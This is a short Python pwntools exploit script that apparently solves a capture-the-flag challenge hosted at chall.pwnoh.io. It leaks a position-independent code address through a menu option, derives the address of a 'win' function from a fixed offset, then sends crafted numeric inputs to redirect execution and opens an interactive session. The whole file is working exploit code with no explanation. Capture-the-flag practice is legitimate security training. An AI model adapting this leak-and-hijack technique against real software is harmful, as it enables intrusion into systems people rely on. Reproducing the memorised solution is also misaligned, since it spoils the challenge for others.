#!/usr/bin/env python3

from pwn import *

# context.log_level = 'debug'

exe = ELF("./a.out")

context.binary = exe
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = """
b *main
continue
"""

def conn():
    if args.REMOTE:
        r = remote("chall.pwnoh.io", 13382)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])

    return r


def main():
    r = conn()
    
    # pie leak
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', b'255')
    
    leak = r.recvline()
    leak = leak[0:6]
    # convert leak to int
    leak = int.from_bytes(leak, "little")
    log.info(f'Leak: {hex(leak)}')
    
    # get win address
    win = leak - 0xa4
    
    r.sendlineafter(b'> ', b'10')
    r.sendlineafter(b'> ', b'1 ' * 8 + b'16 25')
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', f'16 {win} 6 9'.encode())

    r.interactive()


if __name__ == "__main__":
    main()